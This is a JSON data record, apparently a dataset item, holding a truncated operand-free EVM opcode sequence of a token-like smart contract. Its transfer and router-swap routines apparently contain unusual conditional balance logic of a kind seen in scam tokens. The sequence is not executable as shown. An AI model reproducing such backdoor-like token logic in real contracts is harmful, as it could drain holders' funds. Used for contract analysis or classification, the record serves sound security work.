{
  "opcode_sequence": "PUSH1 PUSH1 MSTORE CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH1 CALLDATASIZE LT PUSH2 JUMPI PUSH1 CALLDATALOAD PUSH1 SHR DUP1 PUSH4 GT PUSH2 JUMPI DUP1 PUSH4 GT PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI PUSH2 JUMP JUMPDEST DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI PUSH2 JUMP JUMPDEST DUP1 PUSH4 GT PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI PUSH2 JUMP JUMPDEST DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI JUMPDEST PUSH1 DUP1 REVERT JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 PUSH1 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 PUSH1 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 PUSH1 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST STOP JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 PUSH1 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 PUSH1 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 PUSH1 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST STOP JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 PUSH1 DUP1 SLOAD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST DUP1 PUSH1 ADD PUSH1 DUP1 SWAP2 DIV MUL PUSH1 ADD PUSH1 MLOAD SWAP1 DUP2 ADD PUSH1 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 ADD DUP3 DUP1 SLOAD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST DUP1 ISZERO PUSH2 JUMPI DUP1 PUSH1 LT PUSH2 JUMPI PUSH2 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 ADD SWAP2 PUSH2 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 MSTORE PUSH1 PUSH1 SHA3 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 ADD SWAP1 PUSH1 ADD DUP1 DUP4 GT PUSH2 JUMPI DUP3 SWAP1 SUB PUSH1 AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 PUSH2 CALLER DUP5 DUP5 PUSH2 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 PUSH1 SLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 DUP1 DUP3 GT PUSH2 JUMPI PUSH1 MLOAD PUSH32 DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 DUP5 DUP5 DUP5 PUSH2 JUMP JUMPDEST DUP3 PUSH20 AND DUP5 PUSH20 AND PUSH32 DUP5 PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 PUSH2 DUP5 CALLER DUP5 PUSH1 PUSH1 DUP10 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 PUSH1 CALLER PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 SLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST SWAP1 POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 DUP1 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH1 AND PUSH1 AND SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH20 AND DUP2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 DUP4 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH20 AND PUSH2 PUSH2 JUMP JUMPDEST PUSH20 AND EQ PUSH2 JUMPI PUSH1 MLOAD PUSH32 DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 PUSH1 PUSH2 JUMP JUMPDEST JUMP JUMPDEST PUSH1 DUP1 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH20 AND SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 PUSH1 DUP1 SLOAD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST DUP1 PUSH1 ADD PUSH1 DUP1 SWAP2 DIV MUL PUSH1 ADD PUSH1 MLOAD SWAP1 DUP2 ADD PUSH1 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 ADD DUP3 DUP1 SLOAD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST DUP1 ISZERO PUSH2 JUMPI DUP1 PUSH1 LT PUSH2 JUMPI PUSH2 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 ADD SWAP2 PUSH2 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 MSTORE PUSH1 PUSH1 SHA3 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 ADD SWAP1 PUSH1 ADD DUP1 DUP4 GT PUSH2 JUMPI DUP3 SWAP1 SUB PUSH1 AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 PUSH2 CALLER DUP5 DUP5 PUSH2 JUMP JUMPDEST DUP3 PUSH20 AND CALLER PUSH20 AND PUSH32 DUP5 PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 PUSH1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 SLOAD DUP2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 DUP5 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 PUSH1 DUP4 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 SLOAD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH20 AND PUSH2 PUSH2 JUMP JUMPDEST PUSH20 AND EQ PUSH2 JUMPI PUSH1 MLOAD PUSH32 DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 PUSH20 AND DUP2 PUSH20 AND SUB PUSH2 JUMPI PUSH1 MLOAD PUSH32 DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 DUP2 PUSH2 JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH20 AND DUP2 JUMP JUMPDEST PUSH1 DUP1 PUSH20 AND DUP5 PUSH20 AND EQ ISZERO DUP1 ISZERO PUSH2 JUMPI POP PUSH1 PUSH20 AND DUP4 PUSH20 AND EQ ISZERO JUMPDEST PUSH2 JUMPI PUSH1 MLOAD PUSH32 DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP2 PUSH1 PUSH1 DUP7 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 PUSH1 DUP6 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 DUP2 SWAP1 SSTORE POP DUP3 PUSH20 AND DUP5 PUSH20 AND PUSH32 DUP5 PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 PUSH1 SWAP1 POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 PUSH1 PUSH1 PUSH1 SLOAD DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH20 AND SWAP1 POP PUSH1 PUSH1 PUSH1 PUSH1 SLOAD DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH20 AND PUSH20 AND DUP6 PUSH20 AND EQ SWAP1 POP PUSH1 PUSH1 SLOAD SWAP1 POP PUSH1 PUSH1 PUSH1 DUP9 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 SLOAD EQ DUP1 ISZERO PUSH2 JUMPI POP DUP2 ISZERO JUMPDEST DUP1 ISZERO PUSH2 JUMPI POP PUSH1 PUSH1 PUSH1 DUP9 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 SLOAD GT JUMPDEST ISZERO PUSH2 JUMPI DUP1 PUSH1 PUSH1 DUP9 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 PUSH1 DUP3 DUP3 SLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST SWAP3 POP POP DUP2 SWAP1 SSTORE POP JUMPDEST DUP5 PUSH1 PUSH1 PUSH1 SLOAD DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 PUSH1 PUSH2 EXP DUP2 SLOAD DUP2 PUSH20 MUL NOT AND SWAP1 DUP4 PUSH20 AND MUL OR SWAP1 SSTORE POP PUSH1 PUSH1 PUSH1 DUP9 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 SLOAD GT DUP1 ISZERO PUSH2 JUMPI POP PUSH1 DUP5 EQ JUMPDEST ISZERO PUSH2 JUMPI DUP1 PUSH1 PUSH1 DUP8 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 PUSH1 DUP3 DUP3 SLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST SWAP3 POP POP DUP2 SWAP1 SSTORE POP JUMPDEST DUP1 PUSH1 PUSH1 DUP6 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 PUSH1 DUP3 DUP3 SLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST SWAP3 POP POP DUP2 SWAP1 SSTORE POP PUSH1 PUSH1 PUSH1 DUP9 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 SLOAD GT DUP1 ISZERO PUSH2 JUMPI POP PUSH1 SLOAD DUP5 GT JUMPDEST ISZERO PUSH2 JUMPI PUSH2 DUP5 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH1 PUSH1 SLOAD PUSH1 DUP7 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST SWAP1 POP DUP1 DUP6 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST SWAP5 POP DUP1 PUSH1 PUSH1 DUP10 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 PUSH1 DUP3 DUP3 SLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST SWAP3 POP POP DUP2 SWAP1 SSTORE POP DUP5 PUSH1 PUSH1 DUP10 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 PUSH1 DUP3 DUP3 SLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST SWAP3 POP POP DUP2 SWAP1 SSTORE POP DUP5 PUSH1 PUSH1 DUP9 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 PUSH1 DUP3 DUP3 SLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST SWAP3 POP POP DUP2 SWAP1 SSTORE POP POP JUMPDEST POP POP POP POP POP POP JUMP JUMPDEST PUSH1 CALLER SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 DUP1 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH20 AND SWAP1 POP DUP2 PUSH1 DUP1 PUSH2 EXP DUP2 SLOAD DUP2 PUSH20 MUL NOT AND SWAP1 DUP4 PUSH20 AND MUL OR SWAP1 SSTORE POP DUP2 PUSH20 AND DUP2 PUSH20 AND PUSH32 PUSH1 MLOAD PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH1 PUSH1 PUSH8 DUP2 GT ISZERO PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST JUMPDEST PUSH1 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 MUL PUSH1 ADD DUP3 ADD PUSH1 MSTORE DUP1 ISZERO PUSH2 JUMPI DUP2 PUSH1 ADD PUSH1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP ADDRESS DUP2 PUSH1 DUP2 MLOAD DUP2 LT PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST JUMPDEST PUSH1 MUL PUSH1 ADD ADD SWAP1 PUSH20 AND SWAP1 DUP2 PUSH20 AND DUP2 MSTORE POP POP PUSH1 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH20 AND PUSH20 AND PUSH4 PUSH1 MLOAD DUP2 PUSH4 AND PUSH1 SHL DUP2 MSTORE PUSH1 ADD PUSH1 PUSH1 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 JUMPI RETURNDATASIZE PUSH1 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 REVERT JUMPDEST POP POP POP POP PUSH1 MLOAD RETURNDATASIZE PUSH1 NOT PUSH1 DUP3 ADD AND DUP3 ADD DUP1 PUSH1 MSTORE POP DUP2 ADD SWAP1 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST DUP2 PUSH1 DUP2 MLOAD DUP2 LT PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST JUMPDEST PUSH1 MUL PUSH1 ADD ADD SWAP1 PUSH20 AND SWAP1 DUP2 PUSH20 AND DUP2 MSTORE POP POP PUSH2 ADDRESS PUSH1 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH20 AND DUP5 PUSH2 JUMP JUMPDEST POP PUSH1 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH20 AND PUSH20 AND PUSH4 DUP4 PUSH1 DUP5 CALLER TIMESTAMP PUSH1 MLOAD DUP7 PUSH4 AND PUSH1 SHL DUP2 MSTORE PUSH1 ADD PUSH2 SWAP6 SWAP5 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 JUMPI RETURNDATASIZE PUSH1 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 REVERT JUMPDEST POP POP POP POP POP POP JUMP JUMPDEST PUSH1 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 DUP3 DUP3 MSTORE PUSH1 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 DUP2 ADD SWAP1 POP PUSH2 JUMP JUMPDEST DUP4 DUP2 GT ISZERO PUSH2 JUMPI PUSH1 DUP5 DUP5 ADD MSTORE JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 PUSH1 NOT PUSH1 DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 PUSH2 DUP3 PUSH2 JUMP JUMPDEST PUSH2 DUP2 DUP6 PUSH2 JUMP JUMPDEST SWAP4 POP PUSH2 DUP2 DUP6 PUSH1 DUP7 ADD PUSH2 JUMP JUMPDEST PUSH2 DUP2 PUSH2 JUMP JUMPDEST DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 DUP4 ADD MSTORE PUSH2 DUP2 DUP5 PUSH2 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 DUP1 REVERT JUMPDEST PUSH1 PUSH20 DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 PUSH2 DUP3 PUSH2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 DUP2 PUSH2 JUMP JUMPDEST DUP2 EQ PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 DUP2 CALLDATALOAD SWAP1 POP PUSH2 DUP2 PUSH2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 DUP2 PUSH2 JUMP JUMPDEST DUP2 EQ PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 DUP2 CALLDATALOAD SWAP1 POP PUSH2 DUP2 PUSH2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 DUP1 PUSH1 DUP4 DUP6 SUB SLT ISZERO PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST JUMPDEST PUSH1 PUSH2 DUP6 DUP3 DUP7 ADD PUSH2 JUMP JUMPDEST SWAP3 POP POP PUSH1 PUSH2 DUP6 DUP3 DUP7 ADD PUSH2 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 DUP2 PUSH2 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 ADD SWAP1 POP PUSH2 PUSH1 DUP4 ADD DUP5 PUSH2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 DUP2 PUSH2 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 ADD SWAP1 POP PUSH2 PUSH1 DUP4 ADD DUP5 PUSH2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 DUP1 PUSH1 PUSH1 DUP5 DUP7 SUB SLT ISZERO PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST JUMPDEST PUSH1 PUSH2 DUP7 DUP3 DUP8 ADD PUSH2 JUMP JUMPDEST SWAP4 POP POP PUSH1 PUSH2 DUP7 DUP3 DUP8 ADD PUSH2 JUMP JUMPDEST SWAP3 POP POP PUSH1 PUSH2 DUP7 DUP3 DUP8 ADD PUSH2 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 POP SWAP3 JUMP JUMPDEST PUSH2 DUP2 PUSH2 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 ADD SWAP1 POP PUSH2 PUSH1 DUP4 ADD DUP5 PUSH2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 DUP5 SUB SLT ISZERO PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST JUMPDEST PUSH1 PUSH2 DUP5 DUP3 DUP6 ADD PUSH2 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 DUP1 PUSH1 DUP4 DUP6 SUB SLT ISZERO PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST JUMPDEST PUSH1 PUSH2 DUP6 DUP3 DUP7 ADD PUSH2 JUMP JUMPDEST SWAP3 POP POP PUSH1 PUSH2 DUP6 DUP3 DUP7 ADD PUSH2 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 PUSH2 PUSH2 PUSH2 DUP5 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 PUSH2 DUP3 PUSH2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 PUSH2 DUP3 PUSH2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 DUP2 PUSH2 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 ADD SWAP1 POP PUSH2 PUSH1 DUP4 ADD DUP5 PUSH2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 PUSH1 MSTORE PUSH1 PUSH1 MSTORE PUSH1 PUSH1 REVERT JUMPDEST PUSH1 PUSH1 DUP3 DIV SWAP1 POP PUSH1 DUP3 AND DUP1 PUSH2 JUMPI PUSH1 DUP3 AND SWAP2 POP JUMPDEST PUSH1 DUP3 LT DUP2 SUB PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST JUMPDEST POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 PUSH2 PUSH1 DUP4 PUSH2 JUMP JUMPDEST SWAP2 POP PUSH2 DUP3 PUSH2 JUMP JUMPDEST PUSH1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 DUP4 ADD MSTORE PUSH2 DUP2 PUSH2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 PUSH1 MSTORE PUSH1 PUSH1 MSTORE PUSH1 PUSH1 REVERT JUMPDEST PUSH1 PUSH2 DUP3 PUSH2 JUMP JUMPDEST SWAP2 POP PUSH2 DUP4 PUSH2 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 LT ISZERO PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST JUMPDEST DUP3 DUP3 SUB SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 PUSH1 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 PUSH2 PUSH1 DUP4 PUSH2 JUMP JUMPDEST SWAP2 POP PUSH2 DUP3 PUSH2 JUMP JUMPDEST PUSH1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 DUP4 ADD MSTORE PUSH2 DUP2 PUSH2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 PUSH2 PUSH1 DUP4 PUSH2 JUMP JUMPDEST SWAP2 POP PUSH2 DUP3 PUSH2 JUMP JUMPDEST PUSH1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 